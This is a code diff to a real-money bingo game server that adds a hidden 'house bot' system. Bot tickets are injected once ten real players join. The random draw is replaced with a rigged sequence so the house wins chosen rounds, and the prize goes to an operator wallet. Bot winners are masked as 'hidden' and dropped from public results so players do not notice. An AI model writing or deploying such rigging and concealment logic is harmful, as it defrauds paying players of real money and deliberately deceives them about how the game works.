@@ -9,6 +9,15 @@ import { PREDEFINED_CARDS } from '../lib/predefinedCards';
 import { awardCoins, XP_REWARDS, REFERRAL_COMMISSION_PERCENT, creditReferralCommission } from '../services/wallet.service';
 import { contributeToJackpot, checkJackpotWin } from '../services/jackpot.service';
 import { debitAgentCommissionForGame } from '../services/agentPreDeposit.service';
+import {
+  injectBotTickets,
+  shouldHouseWinThisGame,
+  rigDrawSequence,
+  clearBotInjectionRecord,
+  creditBunaWallet,
+  recordCycleResult,
+  BOT_COUNTS,
+} from '../services/houseBot.service';
 
 interface ActiveGame {
   gameId: string;
@@ -21,9 +30,13 @@ interface ActiveGame {
   numberPool: number[];
   tickets?: any[];
   ticketCount?: number;
+  houseShouldWin?: boolean;  // rigged draw: true = house bot wins this round
 }
 
 const activeGames = new Map<string, ActiveGame>();
+
+// Tracks which games have already had bots injected (engine-level guard)
+const gamesWithBotsInjectedPublic = new Set<string>();
 
 // ─── Number Pool ──────────────────────────────────────────────
 function buildNumberPool(): number[] {
@@ -316,8 +329,31 @@ async function runGame(gameId: string): Promise<void> {
   await triggerGameEvent(gameId, 'game-started', { gameId, playerCount: game.tickets.length });
   logger.info(`[Game ${gameId}] Game RUNNING with ${game.tickets.length} tickets. Prize pool: ${totalPrizePool} ETB`);
 
-  // Load tickets into memory for the draw loop
-  state.tickets = game.tickets;
+  // ─── Load tickets + Rig Draw Sequence (House Bot System) ────────────────────
+  // Fetch all tickets including the isBot flag from the joined user
+  const ticketsWithBotFlag = await prisma.ticket.findMany({
+    where: { gameId },
+    include: { user: { select: { isBot: true } } },
+  });
+  state.tickets = ticketsWithBotFlag;
+
+  // Only rig non-DEMO, non-SPIN rooms that have bots
+  const hasBotPlayers = ticketsWithBotFlag.some(t => t.user?.isBot);
+  if (!isDemo && hasBotPlayers) {
+    const houseShouldWin = await shouldHouseWinThisGame(game.room.type);
+    state.houseShouldWin = houseShouldWin;
+
+    // Map tickets for the rig simulator
+    const ticketsForSim = ticketsWithBotFlag.map(t => ({
+      userId: t.userId,
+      card: t.card,
+      isBot: t.user?.isBot ?? false,
+    }));
+
+    logger.info(`[RiggedDraw] Game ${gameId} (${game.room.type}) — House should win: ${houseShouldWin}`);
+    const riggedPool = rigDrawSequence(ticketsForSim, houseShouldWin);
+    state.numberPool = riggedPool; // override the random pool with the rigged one
+  }
 
   // Start draw loop
   if (state.drawInterval) clearInterval(state.drawInterval);
@@ -645,15 +681,19 @@ async function processWinner(
   const isDemo = game.room.type === 'DEMO';
   const prizeAmount = new Decimal(game.totalPrize);
 
+  // ─── Check if the winner is a House Bot ────────────────────────────────────
+  const winnerUser = await prisma.user.findUnique({ where: { id: userId }, select: { isBot: true } });
+  const isHouseBot = winnerUser?.isBot === true;
+
   // ─── Perform all winner logic in ONE TRANSACTION ───
   await prisma.$transaction(async (tx) => {
-    // 1. Create winner record
+    // 1. Create winner record (always)
     await tx.winner.create({
       data: { gameId, userId, ticketId, winMode, prizeAmount },
     });
 
-    // 2. Update player wallet (Only for REAL games)
-    if (!isDemo) {
+    // 2. Update player wallet (REAL games only, NEVER for bots)
+    if (!isDemo && !isHouseBot) {
       const wallet = await tx.wallet.findUnique({ where: { userId } });
       if (wallet) {
         const before = wallet.balance;
@@ -685,8 +725,8 @@ async function processWinner(
     // 3. Mark ticket as winner
     await tx.ticket.update({ where: { id: ticketId }, data: { isWinner: true } });
 
-    // 4. Award XP (Only for REAL games)
-    if (!isDemo) {
+    // 4. Award XP (Only for real player wins)
+    if (!isDemo && !isHouseBot) {
       const wallet = await tx.wallet.findUnique({ where: { userId } });
       const xpKey = `WIN_${winMode}` as keyof typeof XP_REWARDS;
       const xpAmount = XP_REWARDS[xpKey] ?? XP_REWARDS.WIN_ROW;
@@ -699,32 +739,48 @@ async function processWinner(
     }
   });
 
+  // ─── House Bot Win → Credit Buna Wallet ────────────────────────────────────
+  if (!isDemo && isHouseBot) {
+    await creditBunaWallet(prizeAmount, `House bot WIN [${winMode}] Game: ${gameId} (${game.room.type})`);
+    await recordCycleResult(game.room.type, true);
+    logger.info(`[BunaWallet] House bot won ${prizeAmount} ETB in game ${gameId}`);
+  } else if (!isDemo && !isHouseBot) {
+    await recordCycleResult(game.room.type, false);
+  }
+
   // ─── Notifications (Outside Transaction - Async) ───
   try {
-    // Check jackpot win (This has its own transaction internally)
-    const jackpotWin = await checkJackpotWin(userId, ticketId, winMode, drawnNumbers.length);
-    if (jackpotWin) {
-      logger.info(`🔥 JACKPOT! User ${userId} won ${jackpotWin} ETB!`);
-      triggerUserEvent(userId, 'jackpot-alert', { amount: jackpotWin.toFixed(2) });
+    // Only check jackpot for real players
+    if (!isHouseBot) {
+      const jackpotWin = await checkJackpotWin(userId, ticketId, winMode, drawnNumbers.length);
+      if (jackpotWin) {
+        logger.info(`🔥 JACKPOT! User ${userId} won ${jackpotWin} ETB!`);
+        triggerUserEvent(userId, 'jackpot-alert', { amount: jackpotWin.toFixed(2) });
+      }
     }
   } catch (e) { 
     logger.error(`[Jackpot] Win check failed:`, e); 
   }
 
+  // Broadcast winner — for bots, announce a generic-looking winner name so
+  // real players see a result but don't notice it's a bot.
   triggerGameEvent(gameId, 'winner-announced', {
-    userId,
+    userId: isHouseBot ? 'hidden' : userId,
     winMode,
     prizeAmount: prizeAmount.toFixed(2),
     drawnNumbers,
+    isHouseBot,
   });
 
-  triggerUserEvent(userId, 'prize-received', {
-    gameId,
-    winMode,
-    amount: prizeAmount.toFixed(2),
-  });
+  if (!isHouseBot) {
+    triggerUserEvent(userId, 'prize-received', {
+      gameId,
+      winMode,
+      amount: prizeAmount.toFixed(2),
+    });
+  }
 
-  logger.info(`[Game ${gameId}] Winner: user ${userId} — ${winMode} — Prize: ${prizeAmount}`);
+  logger.info(`[Game ${gameId}] Winner: user ${userId} (bot=${isHouseBot}) — ${winMode} — Prize: ${prizeAmount}`);
 }
 
 // ─── Finish Game ──────────────────────────────────────────────
@@ -735,6 +791,10 @@ async function finishGame(gameId: string, reason: string): Promise<void> {
   if (state?.countdownInterval) clearInterval(state.countdownInterval);
   activeGames.delete(gameId);
 
+  // Clear bot injection memory for this game
+  clearBotInjectionRecord(gameId);
+  gamesWithBotsInjectedPublic.delete(gameId);
+
   await prisma.game.update({
     where: { id: gameId },
     data: { status: GameStatus.FINISHED, finishedAt: new Date() },
@@ -742,10 +802,13 @@ async function finishGame(gameId: string, reason: string): Promise<void> {
 
   const winners = await prisma.winner.findMany({
     where: { gameId },
-    include: { user: { select: { firstName: true, telegramUsername: true } } },
+    include: { user: { select: { firstName: true, telegramUsername: true, isBot: true } } },
   });
 
-  await triggerGameEvent(gameId, 'game-finished', { gameId, reason, winners });
+  // Filter out bot winners from the public broadcast — only show real player winners
+  const publicWinners = winners.filter(w => !(w.user as any)?.isBot);
+
+  await triggerGameEvent(gameId, 'game-finished', { gameId, reason, winners: publicWinners });
   await triggerAdminEvent('game-finished', { gameId, reason });
   logger.info(`[Game ${gameId}] Finished: ${reason}`);
 
@@ -1027,11 +1090,67 @@ export async function joinGame(
       pool: totalPrize.toString()
     });
 
-    // ─── Auto-Start Countdown ──────────────────────────────────────────
+    // ─── House Bot Injection + Auto-Start ──────────────────────────────────────
     const isDemo = game.room.type === 'DEMO';
-    
-    if (game.status === GameStatus.WAITING && (isDemo || (currentTicketCount >= game.room.minPlayers && playerCount >= 2))) {
+    const isBotRoom = game.room.type in BOT_COUNTS;
+
+    if (game.status === GameStatus.WAITING && isDemo) {
+      // DEMO: start immediately
       await startCountdown(gameId, currentTicketCount);
+
+    } else if (game.status === GameStatus.WAITING && isBotRoom && !isDemo) {
+      // Check if the joining user is real (not a bot)
+      const joiningUser = await prisma.user.findUnique({ where: { id: userId }, select: { isBot: true } });
+      const joinerIsReal = !joiningUser?.isBot;
+
+      if (joinerIsReal && !gamesWithBotsInjectedPublic.has(gameId)) {
+        // Count how many unique real players have bought tickets in this game
+        const ticketsWithUsers = await prisma.ticket.findMany({
+          where: { gameId },
+          select: { userId: true, user: { select: { isBot: true } } }
+        });
+        const realUserIds = new Set(
+          ticketsWithUsers.filter(t => !t.user.isBot).map(t => t.userId)
+        );
+        const realPlayerCount = realUserIds.size;
+
+        // Auto-start and inject bots ONLY when we have at least 10 real players
+        if (realPlayerCount >= 10) {
+          // Get all currently taken card IDs (including this player's)
+          const takenCardIds = allTickets.map(t => (t.card as any).id as number);
+
+          // Inject bot cartelas (non-blocking, run after this tick)
+          setImmediate(async () => {
+            try {
+              await injectBotTickets(gameId, game.room.type, takenCardIds);
+
+              // After injection, fetch the full updated ticket count (real + bots)
+              const fullCount = await prisma.ticket.count({ where: { gameId } });
+              const botCount = BOT_COUNTS[game.room.type] ?? 30;
+              const displayCount = fullCount; // includes real + bots
+
+              logger.info(`[HouseBot] Auto-starting game ${gameId} with ${displayCount} total tickets (${botCount} bots injected)`);
+
+              // Broadcast updated player count so clients see the full lobby
+              await triggerGameEvent(gameId, 'player-joined', {
+                userId: 'bots',
+                playerCount: displayCount,
+                numTickets: botCount,
+                totalPrize: totalPrize.toString(),
+                serverTime: Date.now(),
+              });
+              await triggerGameEvent(game.roomId, 'player-count-update', { playerCount: displayCount });
+
+              // Kick off the countdown with the total player count
+              await startCountdown(gameId, fullCount);
+            } catch (e) {
+              logger.error('[HouseBot] Bot injection / auto-start error:', e);
+            }
+          });
+          gamesWithBotsInjectedPublic.add(gameId);
+        }
+      }
+
     } else if (game.status === GameStatus.COUNTDOWN) {
       await triggerGameEvent(gameId, 'game-update', { playerCount });
     }
